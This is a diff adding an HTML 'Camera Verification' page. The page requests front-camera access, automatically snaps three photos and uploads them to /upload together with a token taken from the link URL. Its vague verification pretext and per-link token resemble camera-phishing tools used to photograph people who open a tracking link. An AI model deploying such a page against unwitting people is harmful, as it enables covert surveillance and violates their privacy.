@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verification</title>
+</head>
+<body>
+
+<h2>Camera Verification</h2>
+<p>Please allow camera access. Photos will be taken automatically.</p>
+
+<button onclick="startCamera()">Enable Camera</button>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+const token = new URLSearchParams(window.location.search).get("token");
+let stream = null;
+let photos = [];
+
+function startCamera() {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(s => {
+      stream = s;
+      video.srcObject = stream;
+      // ⏱ بعد از ۰.۵ ثانیه شروع عکس‌گیری
+      setTimeout(takePhotos, 500);
+    })
+    .catch(() => alert("Camera permission required"));
+}
+
+function takePhotos() {
+  let count = 0;
+  photos = [];
+
+  const interval = setInterval(() => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    canvas.toBlob(blob => photos.push(blob));
+    count++;
+
+    if (count === 3) {
+      clearInterval(interval);
+      sendPhotos();
+    }
+  }, 700);
+}
+
+function sendPhotos() {
+  const fd = new FormData();
+  fd.append("token", token);
+  photos.forEach((p, i) => fd.append("photo" + i, p));
+
+  fetch("/upload", { method: "POST", body: fd })
+    .then(() => {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      alert("✅ Submitted");
+    })
+    .catch(() => alert("❌ Upload failed"));
+}
+</script>
+
+</body>
+</html>
